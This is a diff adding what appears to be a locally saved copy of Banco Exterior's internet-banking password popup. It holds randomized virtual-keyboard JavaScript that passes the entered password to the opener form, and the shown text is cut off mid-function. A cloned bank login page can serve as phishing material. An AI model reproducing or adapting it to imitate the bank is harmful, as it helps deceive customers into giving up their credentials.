@@ -1,0 +1,1609 @@
+<!-- Bitácora de Modificaciones:
+Autor Fecha Inicio Fecha Fin Descripción
+Lewins Correa 28/10/2008 28/10/2008 Modificacion del teclado Virtual
+de entrada y del formato de valores de salida.
+---o---
+NOTA: Recuerda no eliminar código ya desarrollado, debes comentar la porción
+Código e incluir la nueva, documentando la fecha de la sustitución.
+***************************************************************************************/ -->
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1252"><script x-apm-ba-response-bt="servertime%3D1745508857951%2CapmAgentHost%3Dsdk2bhvmlfmNKBf9HrBkOYqwrJPtA%2FkoXgjcmv6agWw%3D%2CapmServletName%3D6EAn9yz%2FJcRxDCQUH9urlg%3D%3D%2CapmAgentProcess%3DObOejRBtGSSLitYjHHCNFA%3D%3D%2CapmAgentName%3DlH56YTbSZwM3JEPqG8vCmw%3D%3D%2CapmWebAppName%3DZdaznoiTG4bP7c%2FBfozKQXokFyGa63TUQrT1kMKUN18%3D" type="text/javascript" id="ca_eum_ba" src="pw_files/bajs" data-profileurl="http://localhost:80/api/1/urn:ca:tenantId:default-tenant/urn:ca:appId:default-app/profile?agent=browser" data-tenantid="default-tenant" data-appid="default-app" data-appkey="b0361800-4736-11e6-b8e5-bddc75280658"></script>
+<link rel="stylesheet" href="pw_files/style.css">
+
+
+
+<title>Banco Exterior, Sistema de Banca por Internet</title>
+<script src="pw_files/AutoRMUScript.jsp"> </script>
+<script language="JavaScript">
+document.oncontextmenu=new Function("return false");
+document.onmousedown=blurify;
+
+document.ondragstart=new Function("return false");
+document.onselectstart=new Function("return false");
+
+
+//Se habilitan los campos del index.jsp
+habilitarIndexDesdePopup();
+
+
+function enviar() {
+ if (document.forms[0].OPASSWORD.value == ""){
+   alert("La Clave no puede estar en blanco");
+ }
+ else{ 
+	var fecha=new Date();
+	var diames=fecha.getDate();
+	var mes=fecha.getMonth() +1 ;
+	var ano=fecha.getFullYear();
+	var fechaLogOnload = "[" + diames + "/" + mes + "/" + ano + " " + fecha + "]";
+	opener.document.forms[0].OPASSWORD.value = document.forms[0].OPASSWORD.value;
+	opener.document.forms[0].FechaPhishingLoad.value = document.forms[0].FechaPhishingLoad.value;
+	opener.document.forms[0].FechaPhishingOnload.value = fechaLogOnload;
+	window.opener.document.forms[0].submit();
+	window.close();
+ }  
+}
+
+
+function SHOWN() {
+  document.getElementById('N_DIV').style.display="";
+  document.getElementById('A_DIV').style.display="none";
+
+}
+
+
+
+
+
+function SHOWA() {		
+	  
+  if(!(window.is_touch_device = (/iPhone|iPod|iPad/i).test(navigator.userAgent)))
+  {
+  	document.getElementById('N_DIV').style.display="none";
+  	document.getElementById('A_DIV').style.display="";
+  }
+
+}
+
+
+
+function sload(){
+  SHOWN();
+  SHOWNLETRA();
+  Nifty("table.buttond a","transparent small");
+  Nifty("table.teclad a","transparent small");
+  
+}
+
+var NUM0=-1;NUM1=-1;NUM2=-1;NUM3=-1;NUM4=-1;NUM5=-1;NUM6=-1;NUM7=-1;NUM8=-1;NUM9=-1;
+
+var TABLE = "";
+var IMG0 = "Img_";
+var IMG1 = "Img_";
+var	IMG2 = "Img_";
+var	IMG3 = "Img_";
+var	IMG4 = "Img_";
+var	IMG5 = "Img_";
+var	IMG6 = "Img_";
+var	IMG7 = "Img_";
+var	IMG8 = "Img_";
+var	IMG9 = "Img_";
+
+function numOrder(){
+	var x=0;
+	var FNUM;
+
+	while (x<10){
+		addok = true;
+		FNUM = (Math.round(Math.random()*9));
+		if ((NUM0 == FNUM) || (NUM1 == FNUM) || (NUM2 == FNUM) || (NUM3 == FNUM) || (NUM4 == FNUM) || (NUM5 == FNUM) || (NUM6 == FNUM) || (NUM7 == FNUM) || (NUM8 == FNUM) || (NUM9 == FNUM)) {
+			addok = false;
+			//FNUM = Math.random() * 10;
+			//FNUM = Math.round(FNUM);
+		}
+			if (addok) {
+				switch (x) {
+					case 0 :
+						IMG0 = IMG0 + FNUM;
+						NUM0 = FNUM;
+						break;
+					case 1 :
+						IMG1 = IMG1 + FNUM;
+						NUM1 = FNUM;
+						break;
+					case 2 :
+						IMG2 = IMG2 + FNUM;
+						NUM2 = FNUM;
+						break;
+					case 3 :
+						IMG3 = IMG3 + FNUM;
+						NUM3 = FNUM;
+						break;
+					case 4 :
+						IMG4 = IMG4 + FNUM;
+						NUM4 = FNUM;
+						break;
+					case 5 :
+						IMG5 = IMG5 + FNUM;
+						NUM5 = FNUM;
+						break;
+					case 6 :
+						IMG6 = IMG6 + FNUM;
+						NUM6 = FNUM;
+						break;
+					case 7 :
+						IMG7 = IMG7 + FNUM;
+						NUM7 = FNUM;
+						break;
+					case 8 :
+						IMG8 = IMG8 + FNUM;
+						NUM8 = FNUM;
+						break;
+					case 9 :
+						IMG9 = IMG9 + FNUM;
+						NUM9 = FNUM;
+						break;
+				}
+
+				x++;
+			}
+	}
+}
+
+
+function getTableN(){
+
+numOrder();
+
+var enc = new Array(10);
+
+ enc[0]='TZxmpv0wxMs=';
+ enc[1]='RtP4dgZcNrU=';
+ enc[2]='DTkzkxnMNMM=';
+ enc[3]='KFMDwPcKxrg=';
+ enc[4]='ME8K+FNzX54=';
+ enc[5]='FwUvvrEwlgU=';
+ enc[6]='uD6WWYmlJWw=';
+ enc[7]='g5lIfce23Q4=';
+ enc[8]='+GOatOIpWVQ=';
+ enc[9]='18ibVPlVH1o=';
+
+var extraStyle="";
+
+TABLE ="<table   class=\"teclad\">";
+		//Primera Fila
+		TABLE += "<TR>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM0]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ NUM0
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM1]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ NUM1
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM2]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ NUM2
+			+ "</a></td>";
+		TABLE += "</TR><TR>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM3]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ NUM3
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM4]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ NUM4
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM5]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ NUM5
+			+ "</a></td>";
+		TABLE += "</TR><TR>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM6]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ NUM6
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM7]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ NUM7
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM8]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ NUM8
+			+ "</a></td>";
+		TABLE += "</TR><TR>";
+		TABLE += "<td " + extraStyle +  ">&nbsp;</td>";	
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM9]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ NUM9
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  ">&nbsp;</td>";			
+		TABLE += "</TR>";
+		TABLE += "</TABLE>";
+		document.getElementById("N_DIV").innerHTML= TABLE;
+
+}
+
+function getTableA(){
+
+var enc = new Array(10);
+
+ enc[0]='TZxmpv0wxMs=';
+ enc[1]='RtP4dgZcNrU=';
+ enc[2]='DTkzkxnMNMM=';
+ enc[3]='KFMDwPcKxrg=';
+ enc[4]='ME8K+FNzX54=';
+ enc[5]='FwUvvrEwlgU=';
+ enc[6]='uD6WWYmlJWw=';
+ enc[7]='g5lIfce23Q4=';
+ enc[8]='+GOatOIpWVQ=';
+ enc[9]='18ibVPlVH1o=';
+
+var extraStyle="";
+var aster="*";
+
+TABLE ="<table   class=\"teclad\">";
+		//Primera Fila
+		TABLE += "<TR>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM0]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM1]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM2]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE += "</TR><TR>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM3]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM4]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM5]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE += "</TR><TR>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM6]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM7]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM8]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE += "</TR><TR>";
+		TABLE += "<td " + extraStyle +  ">&nbsp;</td>";	
+		TABLE += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ enc[NUM9]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWA ();\" onmouseout=\"JavaScript:SHOWN ();\""
+			+ ">"
+			+ aster
+			+ "</a></td>";
+		TABLE += "<td " + extraStyle +  ">&nbsp;</td>";			
+		TABLE += "</TR>";
+		TABLE += "</TABLE>";
+		document.getElementById("A_DIV").innerHTML= TABLE;
+
+}
+
+/**
+* Javascript para mostrar el teclado virtual cambiando las letras de orden y enmascarandolas
+**/
+var LET0=-1;LET1=-1;LET2=-1;LET3=-1;LET4=-1;LET5=-1;LET6=-1;LET7=-1;LET8=-1;LET9=-1;LET10=-1;LET11=-1;LET12=-1;LET13=-1;LET14=-1;LET15=-1;LET16=-1;LET17=-1;LET18=-1;LET19=-1;LET20=-1;LET21=-1;LET22=-1;LET23=-1;LET24=-1;LET25=-1;
+var TABLE1 = "";
+
+function SHOWALETRA() {		
+	  
+  if(!(window.is_touch_device = (/iPhone|iPod|iPad/i).test(navigator.userAgent)))
+  {
+  	document.getElementById('N_DIV_LETRA').style.display="none";
+  	document.getElementById('A_DIV_LETRA').style.display="";
+  }
+
+}
+
+function SHOWNLETRA() {
+  document.getElementById('N_DIV_LETRA').style.display="";
+  document.getElementById('A_DIV_LETRA').style.display="none";
+}
+
+function SHOWNTODOS() {
+  document.getElementById('N_DIV').style.display="";
+  document.getElementById('A_DIV').style.display="none";
+  document.getElementById('N_DIV_LETRA').style.display="";
+  document.getElementById('A_DIV_LETRA').style.display="none";
+
+}
+
+function SHOWATODOS() {		
+	  
+  if(!(window.is_touch_device = (/iPhone|iPod|iPad/i).test(navigator.userAgent)))
+  {
+  	document.getElementById('N_DIV').style.display="none";
+  	document.getElementById('A_DIV').style.display="";
+	document.getElementById('N_DIV_LETRA').style.display="none";
+  	document.getElementById('A_DIV_LETRA').style.display="";
+  }
+
+}
+
+function letraOrder(){
+	
+	var Y=0;
+	var FLET;
+
+	while (Y<26){
+		addok = true;
+		FLET = (Math.round(Math.random()*25));
+		if ((LET0 == FLET) || (LET1 == FLET) || (LET2 == FLET) || (LET3 == FLET) || (LET4 == FLET) || (LET5 == FLET) || (LET6 == FLET) || (LET7 == FLET) || (LET8 == FLET) || (LET9 == FLET) || (LET10 == FLET) || (LET11 == FLET) || (LET12 == FLET) || (LET13 == FLET) || (LET14 == FLET) || (LET15 == FLET) || (LET16 == FLET) || (LET17 == FLET) || (LET18 == FLET) || (LET19 == FLET) || (LET20 == FLET) || (LET21 == FLET) || (LET22 == FLET) || (LET23 == FLET) || (LET24 == FLET) || (LET25 == FLET)) {
+			addok = false;
+			//FNUM = Math.random() * 10;
+			//FNUM = Math.round(FNUM);
+		}
+			if (addok) {
+				switch (Y) {
+					case 0 :
+						LET0 = FLET;
+						break;
+					case 1 :
+						LET1 = FLET;
+						break;
+					case 2 :
+						LET2 = FLET;
+						break;
+					case 3 :
+						LET3 = FLET;
+						break;
+					case 4 :
+						LET4 = FLET;
+						break;
+					case 5 :
+						LET5 = FLET;
+						break;
+					case 6 :
+						LET6 = FLET;
+						break;
+					case 7 :
+						LET7 = FLET;
+						break;
+					case 8 :
+						LET8 = FLET;
+						break;
+					case 9 :
+						LET9 = FLET;
+						break;
+					case 10 :
+						LET10 = FLET;
+						break;
+					case 11 :
+						LET11 = FLET;
+						break;
+					case 12 :
+						LET12 = FLET;
+						break;
+					case 13 :
+						LET13 = FLET;
+						break;
+					case 14 :
+						LET14 = FLET;
+						break;
+					case 15 :
+						LET15 = FLET;
+						break;
+					case 16 :
+						LET16 = FLET;
+						break;
+					case 17 :
+						LET17 = FLET;
+						break;
+					case 18 :
+						LET18 = FLET;
+						break;
+					case 19 :
+						LET19 = FLET;
+						break;
+					case 20 :
+						LET20 = FLET;
+						break;
+					case 21 :
+						LET21 = FLET;
+						break;
+					case 22 :
+						LET22 = FLET;
+						break;
+					case 23 :
+						LET23 = FLET;
+						break;
+					case 24 :
+						LET24 = FLET;
+						break;
+					case 25 :
+						LET25 = FLET
+						break;
+				}
+
+				Y++;
+			}
+	}
+}
+
+function getTableLetraN(){
+
+letraOrder();
+
+var LENC = new Array(26);
+var DES = new Array(26);
+
+var extraStyle="";
+
+DES[0]='Q';
+DES[1]='W';
+DES[2]='E';
+DES[3]='R';
+DES[4]='T';
+DES[5]='Y';
+DES[6]='U';
+DES[7]='I';
+DES[8]='O';
+DES[9]='P';
+
+DES[10]='A';
+DES[11]='S';
+DES[12]='D';
+DES[13]='F';
+DES[14]='G';
+DES[15]='H';
+DES[16]='J';
+DES[17]='K';
+DES[18]='L';
+
+DES[19]='Z';
+DES[20]='X';
+DES[21]='C';
+DES[22]='V';
+DES[23]='B';
+DES[24]='N';
+DES[25]='M';
+
+LENC[0]='KAYSvI7rNOY=';
+LENC[1]='dWxOBhzxAwU=';
+LENC[2]='XS7inbCUmyY=';
+LENC[3]='M+vM+sGEB24=';
+LENC[4]='qp37/IPc51c=';
+LENC[5]='K2CwY2aoxYI=';
+LENC[6]='6LXNsEO+GQs=';
+LENC[7]='d7mSZS3T3cg=';
+LENC[8]='EkhlGqIiFs8=';
+LENC[9]='Fypb2XoOIP0=';
+
+LENC[10]='WOaTRl2481A=';
+LENC[11]='AAIF/GrmK9o=';
+LENC[12]='mn4oDqslqDg=';
+LENC[13]='kWBIX0nfCo8=';
+LENC[14]='S7tAkA1t+w8=';
+LENC[15]='CS4GP1+yA3c=';
+LENC[16]='pE4Ql8oM8c0=';
+LENC[17]='AQeP7SarKNw=';
+LENC[18]='UOsBuXTFxpQ=';
+
+LENC[19]='GxWKSGoPDPI=';
+LENC[20]='g99BAWW771g=';
+LENC[21]='vKHiMZYdXgc=';
+LENC[22]='YuHzaIt6OnQ=';
+LENC[23]='/5tfb0GARtM=';          
+LENC[24]='S/oq8RTfU+U=';      
+LENC[25]='SgxJ6mh4PgU=';
+
+
+TABLE1 ="<table   class=\"teclad\">";
+		//Primera Fila
+		TABLE1 += "<TR>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET0]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET0]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET1]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET1]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET2]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET2]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET3]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET3]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET4]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET4]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET5]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET5]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET6]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET6]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET7]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET7]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET8]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET8]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET9]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET9]
+			+ "</a></td>";
+		TABLE1 += "</TR><TR>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET10]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET10]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET11]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET11]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET12]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET12]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET13]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET13]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET14]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET14]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET15]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET15]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET16]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET16]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET17]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET17]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET18]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET18]
+			+ "</a></td>";
+		TABLE1 += "</TR><TR>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET19]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET19]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET20]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET20]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET21]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET21]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET22]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET22]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET23]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET23]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET24]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET24]
+			+ "</a></td>";
+		TABLE1 += "<td " + extraStyle +  "><a onMouseUp=\"JavaScript:anadirLetra('"
+			+ LENC[LET25]
+			+ "','"
+			+ 0
+			+ "',"
+			+ 12
+			+ ");\" onMouseOver=\"JavaScript:SHOWALETRA();\" onmouseout=\"JavaScript:SHOWNLETRA();\""
+			+ ">"
+			+ DES[LET25]
+			+ "</a></td>";	
+		TABLE1 += "</TR>";
+		TABLE1 += "</TABLE>";
+		document.getElementById("N_DIV_LETRA").innerHTML= TABLE1;
+
+}
+
+function getTableLetraA(){
+
+
+var extraStyle="";
+var aster="*";
+
+var LENC = new Array(26);
+var DES = new Array(26);
+
+
+LENC[0]='KAYSvI7rNOY=';
+LENC[1]='dWxOBhzxAwU=';
+LENC[2]='XS7inbCUmyY=';
+LENC[3]='M+vM+sGEB24=';
+LENC[4]='qp37/IPc51c=';
+LENC[5]='K2CwY2aoxYI=';
+LENC[6]='6LXNsEO+GQs=';
+LENC[7]='d7mSZS3T3cg=';
+LENC[8]='EkhlGqIiFs8=';
+LENC[9]='Fypb2XoOIP0=';
+
+LENC[10]='WOaTRl2481A=';
+LENC[11]='AAIF/GrmK9o=';
+LENC[12]='mn4oDqslqDg=';
+LENC[13]='kWBIX0nfCo8=';
+LENC[14]='S7tAkA1t+w8=';
